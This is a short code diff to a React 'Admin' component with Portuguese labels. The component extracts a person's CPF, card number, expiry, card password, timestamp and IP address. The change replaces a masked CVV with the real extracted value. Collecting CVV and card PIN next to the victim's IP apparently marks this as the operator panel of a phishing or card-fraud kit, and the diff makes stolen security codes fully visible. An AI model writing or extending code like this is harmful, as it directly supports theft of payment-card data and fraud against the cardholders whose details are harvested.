@@ -191,7 +191,7 @@ const Admin = () => {
       cpf: extractValue('CPF', 'Não informado'),
       cartao: extractValue('Número do Cartão', '****'),
       validade: extractValue('Validade', 'Não informado'),
-      cvv: '***',
+      cvv: extractValue('CVV', 'Não informado'),
       senhaCartao: extractValue('Senha do Cartão', 'Não informado'),
       data: extractValue('Data/Hora', 'Não informado'),
       ip: extractValue('IP', undefined),
